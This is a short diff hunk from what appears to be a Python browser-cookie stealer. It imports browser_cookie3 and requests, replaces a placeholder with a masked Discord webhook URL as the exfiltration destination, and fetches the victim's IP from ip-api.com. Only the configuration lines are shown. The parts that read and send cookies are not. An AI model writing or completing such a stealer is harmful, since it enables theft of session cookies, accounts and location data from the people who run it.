@@ -13,23 +13,8 @@
                         # Credit me lol or die
  
  import browser_cookie3, requests, threading, os
-
-                               #Put your webhook below in between the ""
-webhook = "Your discord webhook here"
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+                                                              
+webhook = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 
 ip = "http://ip-api.com/json/"
 r = requests.get(ip)
